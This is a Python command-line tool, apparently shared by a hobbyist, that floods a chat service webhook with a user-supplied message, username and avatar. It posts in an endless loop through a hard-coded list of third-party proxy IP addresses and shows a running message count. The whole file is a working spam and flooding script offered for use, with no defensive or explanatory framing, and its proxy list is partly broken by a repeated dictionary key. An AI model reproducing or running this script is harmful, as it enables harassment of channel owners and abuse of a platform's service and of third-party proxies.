#Webhook spammer made by Well#9999
import requests as r
import subprocess as sp
import time as t
from colorama import Fore as f
from os import system
from time import sleep 
from sys import platform
headers = {"Content-Type": "application/json"}
if platform == "win32":
    system("cls")
if platform == "linux" or platform == "linux2":
    system("clear")
if platform == "darwin":
    system("clear")
currentTime = t.ctime()
print(f.GREEN + """
      :::::::: :::::::::    :::      :::   :::    :::   :::  ::::::::::::::::::: 
    :+:    :+::+:    :+: :+: :+:   :+:+: :+:+:  :+:+: :+:+: :+:       :+:    :+: 
   +:+       +:+    +:++:+   +:+ +:+ +:+:+ +:++:+ +:+:+ +:++:+       +:+    +:+  
  +#++:++#+++#++:++#++#++:++#++:+#+  +:+  +#++#+  +:+  +#++#++:++#  +#++:++#:    
        +#++#+      +#+     +#++#+       +#++#+       +#++#+       +#+    +#+    
#+#    #+##+#      #+#     #+##+#       #+##+#       #+##+#       #+#    #+#     
######## ###      ###     ######       ######       ################    ###      
""")
currentTime = t.ctime()
print(f.GREEN+ "[" + currentTime.split(" ")[3]  + "]" + " [*] Success loaded Webhook spammer.")
sleep(1)
#Webhook
print(f.RED + "Input webhook")
currentTime = t.ctime()
webhook = input(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + " >>> ")
webhook_check = r.get(webhook)
currentTime = t.ctime()
if webhook_check.status_code == 404:
    currentTime = t.ctime()
    print(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + f.RED +  " [DATA] " + "[-] FAILED TO CONNECT TO " 
    + webhook)
    currentTime = t.ctime()
    print(f.RED + "try again.")        
    input(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + " >>> ")
else:
    print()
#username of the webhook
currentTime = t.ctime()
print(f.RED + "Input username of the webhook.")
currentTime = t.ctime()
user = input(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + " >>> ")
#Avatar of the webhook (url)
currentTime = t.ctime()
print(f.RED + "Input the webhook avatar (url)")
avatar = input(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + " >>> ")
#Message to send
currentTime = t.ctime()
print(f.RED + "Message: ")
message = input(f.CYAN + "[" + currentTime.split(" ")[3]  + "]" + " >>> ")
data = {
  "content": message,
  "username": user,
  "avatar_url": avatar
}
session = r.Session()
proxy= {
    'http': '78.85.138.22:8081',
    'http': '1.10.133.244:8080',
    'http': '1.10.178.183:8080',
    'http': '123.244.148.14:56609',
    'http': '60.189.127.40:3000',
    'http': '114.239.149.43:9999',
    'http': '171.35.223.240:9999',
    'http': '188.216.179.138:8118',
    'http': '194.193.59.249:8080',
    'http': '115.239.27.40:9999',
    'http': '154.70.98.165:8080',
}
yeah = r.get(webhook)
def black(req):
    global requests_count
    requests_count += 1
    req.headers['X-Seq-Count'] = requests_count
    return req
requests_count = 0
s = r.Session()
s.auth = black
while True:
 currentTime = t.ctime()
 while True:
  yeah = r.get(webhook)
  currentTime = t.ctime()
  print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA+ " [DATA] " + f.RED + " [+]"  + f.BLUE + " STATUS CODE:  " + f.CYAN + str(yeah.status_code))
  print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA + " [DATA] " + f.RED + " [+]"+ f.BLUE + " SPAMMING: " + f.CYAN + webhook)
  print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA + " [DATA] " + f.RED + " [+]" + f.BLUE + " MESSAGE:  " + f.CYAN + message) 
  print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA + " [DATA] " + f.RED + " [+]" + f.BLUE + " TOTAL MESSAGES:  " + f.CYAN + str(requests_count)) 
  sleep(1)
  r.post(webhook,headers=headers,json=data,proxies=proxy,auth=black)
  currentTime = t.ctime()
  if yeah.status_code == 404:
    currentTime = t.ctime()
    print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA +  " [DATA] " + f.RED + " [-] FAILED TO CONNECT TO " + webhook)
    print(f.GREEN + "[" + currentTime.split(" ")[3] + "]"  + f.MAGENTA + " [DATA] " + f.RED + " [*] RETRYING..  ")
    r.post(webhook,headers=headers,json=data,proxies=proxy,auth=black)
    sleep(3)
    print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + f.MAGENTA + " [DATA] " + f.RED + " [-] FAILED TO CONNECT.  ")
    sleep(10)
    currentTime = t.ctime()
    print(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + "Do you want to restart? y/n")
    y = input(f.GREEN + "[" + currentTime.split(" ")[3]  + "]" + "Do you want to restart? y/n")
    if y == "y" or y == "yes" or y == "ye":
        system('cmd /k "python spammer.py" ')
    if y == "n" or y == "no":
     exit() 
